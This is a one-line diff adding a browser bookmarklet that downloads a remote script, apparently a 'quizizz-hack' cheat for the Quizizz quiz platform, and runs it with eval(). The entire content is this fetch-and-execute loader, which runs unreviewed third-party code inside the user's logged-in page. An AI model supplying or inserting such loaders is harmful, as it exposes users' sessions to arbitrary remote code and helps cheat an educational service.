@@ -1,0 +1,1 @@
+javascript:fetch('https://thatfrueddued.github.io/quizizz-hack/Quizizz.js').then(function(response){response.text().then(function(text){eval(text);});});
